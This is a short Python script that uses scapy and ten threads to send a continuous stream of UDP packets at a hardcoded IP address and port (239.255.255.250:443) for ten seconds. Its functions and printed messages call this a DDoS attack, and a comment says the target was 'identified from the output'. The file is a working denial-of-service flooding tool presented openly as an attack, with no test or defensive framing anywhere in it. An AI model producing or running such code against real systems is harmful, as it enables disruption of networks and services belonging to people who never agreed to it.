from scapy.all import send, IP, UDP
import threading
import time

def flood(target_ip, target_port, duration):
    """
    Sends UDP packets to a target IP and port for a specified duration.

    Args:
        target_ip (str): The IP address of the target.
        target_port (int): The port number of the target.
        duration (float): The duration of the attack in seconds.
    """
    # Create a packet with the target IP and port
    packet = IP(dst=target_ip) / UDP(dport=target_port)

    # Calculate the end time of the attack
    end_time = time.time() + duration

    # Send packets until the end time is reached
    while time.time() < end_time:
        # Send the packet, suppressing verbose output
        send(packet, verbose=False)

def start_ddos(target_ip, target_port, duration, num_threads):
    """
    Starts a DDoS attack using multiple threads.

    Args:
        target_ip (str): The IP address of the target.
        target_port (int): The port number of the target.
        duration (int): The duration of the attack in seconds.
        num_threads (int): The number of threads to simulate concurrent attacks.
    """
    # Create a list to store the threads
    threads = []

    # Create and start multiple threads
    for _ in range(num_threads):
        # Create a thread and pass the necessary arguments
        t = threading.Thread(target=flood, args=(target_ip, target_port, duration))
        t.start()
        threads.append(t)

    # Wait for all threads to complete
    for t in threads:
        t.join()

if __name__ == "__main__":
    target_ip = "239.255.255.250"  # Target IP identified from the output
    target_port = 443  # Target port identified from the output
    duration = 10  # Duration of the attack in seconds
    num_threads = 10  # Number of threads to simulate concurrent attacks

    print(f"Starting DDoS attack on {target_ip}:{target_port} for {duration} seconds with {num_threads} threads.")
    start_ddos(target_ip, target_port, duration, num_threads)
    print("DDoS attack simulation completed.")
